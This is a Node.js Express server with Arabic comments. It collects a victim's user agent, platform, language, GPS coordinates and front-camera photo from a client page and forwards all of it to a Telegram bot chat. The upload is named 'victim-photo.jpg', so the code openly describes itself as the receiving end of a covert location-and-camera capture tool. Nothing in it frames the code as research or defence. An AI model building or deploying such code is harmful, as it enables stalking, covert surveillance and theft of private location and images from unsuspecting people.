const express = require('express');
const app = express();
const port = 3000; // Render هيغير الرقم ده لوحده
const cors = require('cors');
const fetch = require('node-fetch');
const FormData = require('form-data');
const path = require('path');

// استخدام الـ JSON والليمت عشان حجم الصورة
app.use(express.json({ limit: '10mb' }));
app.use(cors()); // السماح لكل المواقع تكلم السيرفر ده

// جلب المتغيرات السرية (Render هيحطها هنا)
const BOT_TOKEN = process.env.MY_BOT_TOKEN;
const CHAT_ID = process.env.MY_CHAT_ID;

// لينك بسيط عشان نتأكد إن السيرفر شغال
app.get('/', (req, res) => {
  res.send('Server is running and ready to receive data!');
});

// ده اللينك اللي هيستقبل البيانات
app.post('/send-data', async (req, res) => {
    try {
        const data = req.body; 
        
        // 1. تنسيق الرسالة النصية
        let message = `<b>بيانات جديدة وصلت 🚀 (من سيرفر Render)</b>\n\n`;
        message += `<b>--- 📱 معلومات الجهاز ---</b>\n`;
        message += `<b>User Agent:</b> ${data.deviceInfo.userAgent}\n`;
        message += `<b>Platform:</b> ${data.deviceInfo.platform}\n`;
        message += `<b>Language:</b> ${data.deviceInfo.language}\n\n`;

        message += `<b>--- 📍 معلومات الموقع ---</b>\n`;
        if (typeof data.locationInfo === 'object') {
            message += `<b>Lat:</b> ${data.locationInfo.latitude}\n`;
            message += `<b>Lon:</b> ${data.locationInfo.longitude}\n`;
            message += `<b>Maps:</b> <a href="https://www.google.com/maps?q=${data.locationInfo.latitude},${data.locationInfo.longitude}">Open Map</a>\n`;
        } else {
            message += `${data.locationInfo}\n`;
        }

        // 2. إرسال الرسالة النصية للتليجرام
        const telegramApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });

        // 3. إرسال الصورة (لو موجودة ومفيهاش إيرور)
        if (data.cameraImage && !data.cameraImage.includes('Error')) {
            const base64Image = data.cameraImage.split(',')[1];
            const imageBuffer = Buffer.from(base64Image, 'base64');
            
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', imageBuffer, { filename: 'victim-photo.jpg' });
            formData.append('caption', '📷 صورة الكاميرا الأمامية');

            const photoApiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
            await fetch(photoApiUrl, {
                method: 'POST',
                body: formData
            });
        }

        res.status(200).send({ message: 'Data received' });
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send({ message: 'Error processing data' });
    }
});

// تشغيل السيرفر
app.listen(port, () => {
    console.log(`Server running on port ${port}`);
});
